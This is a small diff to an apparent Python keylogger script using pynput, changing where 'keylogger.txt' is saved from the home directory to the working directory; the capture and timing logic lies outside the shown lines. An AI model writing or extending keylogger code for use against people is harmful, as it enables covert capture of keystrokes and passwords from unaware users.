@@ -4,8 +4,7 @@ from datetime import datetime
 from pynput import keyboard
 
 text = ""
-save_directory = os.path.expanduser("~")
-file_path = os.path.join(save_directory, "keylogger.txt")
+file_path = os.path.join(os.getcwd(), "keylogger.txt")
 time_interval = 10
 
 timer = None
